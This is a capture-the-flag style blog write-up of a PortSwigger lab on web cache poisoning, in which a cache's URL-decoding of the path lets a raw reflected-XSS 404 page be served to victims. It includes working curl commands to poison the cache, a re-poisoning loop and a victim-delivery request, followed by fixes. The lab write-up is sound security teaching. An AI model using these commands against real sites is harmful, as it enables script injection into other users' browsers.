---
layout: post
title: "PortSwigger: Web cache poisoning via URL normalization"
date: 2027-12-10 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, WebCachePoisoning]
tags: [portswigger, web-cache-poisoning, url-normalization, cache-key, interpretation-conflict, xss, cwe-436, cwe-79]
---

A cache sits in front of an app and replays stored responses to make popular pages fast. To decide whether two requests are "the same page" it builds a **cache key** from the request. This lab's cache does something subtle before it builds that key: it *normalizes* — URL-decodes — the path. The app behind it, meanwhile, reflects the path back into an error page byte-for-byte. Those two behaviors disagree about what a URL *is*, and that disagreement ([CWE-436](https://cwe.mitre.org/data/definitions/436.html)) turns a normally-harmless reflected XSS into one you can deliver to other people.

## Overview

Ask for any path that doesn't exist and the app echoes it, unencoded, into a 404 page:

```
GET /randomMARKER  ->  <p>Not Found: /randomMARKER</p>
```

That response is cacheable (`Cache-Control: max-age=10`, and an `X-Cache: miss`/`hit` header tells you when it was served from cache). Two facts combine into the bug:

1. **The origin reflects the path verbatim.** If the path contains `<script>`, the 404 body contains a live, unescaped `<script>`.
2. **The cache normalizes (decodes) the path for its key.** To the cache, `/random<script>` and `/random%3Cscript%3E` are the *same* URL — it decodes the `%3C` before deciding which cache slot the response belongs to.

## Why a path-based reflected XSS is usually safe

You can't make someone else's browser send raw `<` and `>` in a URL. Browsers automatically percent-encode those characters, so when a victim navigates to your malicious link their request arrives as `%3C` / `%3E`, and the origin reflects that *encoded* — and therefore inert — text. The victim sees `&lt;script&gt;`-style harmless output, not running script.

The cache removes that safety net.

## The attack

**Step 1 — poison the cache with the raw payload.** Send the unencoded payload yourself, with a tool that will *not* re-encode the angle brackets (`curl --path-as-is -g`; the `requests` library re-encodes and will not work):

```bash
curl -sk --path-as-is -g 'https://LAB/random</p><script>alert(1)</script><p>foo'
```

The origin reflects it unescaped, and the cache stores that response under the **decoded** key. You'll see `X-Cache: miss` on the first send and the body carries a live `<script>alert(1)</script>`.

**Step 2 — the victim's normal visit hits your poison.** When the victim navigates the same URL their browser encodes it:

```
GET /random%3C/p%3E%3Cscript%3Ealert(1)%3C/script%3E%3Cp%3Efoo
```

The cache decodes that to the exact same key → **cache hit** → it serves the victim *your* unescaped response → `alert(1)` fires in their browser.

You can prove the collision directly by sending the raw request (miss, unescaped script) and then the encoded request back-to-back within the 10-second TTL — the encoded request returns `X-Cache: hit` with the same unescaped script.

**Deliver it.** The lab has a *Deliver link to victim* button that queues a simulated victim to visit a URL you provide (it must start with the lab's own origin). Because the cache TTL is only ~10 seconds, keep re-poisoning in a loop while you deliver:

```bash
# keep the cache warm in the background
( for i in $(seq 1 30); do curl -sk --path-as-is -g 'https://LAB/random</p><script>alert(1)</script><p>foo' -o /dev/null; sleep 2; done ) &

# deliver the encoded URL to the victim
curl -sk 'https://LAB/deliver-to-victim' \
  --data-urlencode 'answer=https://LAB/random%3C/p%3E%3Cscript%3Ealert(1)%3C/script%3E%3Cp%3Efoo'
#  -> {"correct":true}
```

One gotcha: the bare 404 page carries none of the lab's own JavaScript, so loading the poisoned URL yourself and watching the alert pop does **not** mark the lab solved. The lab's simulated victim browser hooks `alert()` at the browser level, so the solve only registers when the delivered victim visits. Moments later the lab status flips to **Solved**.

## The fix

- **HTML-encode the reflected path** before putting it in the 404 body. This kills the XSS at the sink, regardless of any caching quirk — it's the real root cause.
- **Don't cache reflecting responses** (`Cache-Control: no-store` on error pages), or **key the cache on the exact pre-normalization path** so encoded and decoded variants never share a slot.
- Make the cache and origin agree on URL canonicalization — normalize identically on both sides, or not at all.
- A strict Content-Security-Policy (`script-src 'self'`) stops a reflected inline `<script>` from executing even if one slips through.

## Takeaway

Web cache poisoning doesn't always come from an *unkeyed* input. Here every part of the request is keyed — but the cache and the origin **interpret the URL differently**, and that interpretation gap is enough. Whenever a proxy or cache decodes/normalizes a value before another layer consumes the raw form, look for the collision: it lets one attacker-controlled response answer a completely ordinary victim request.
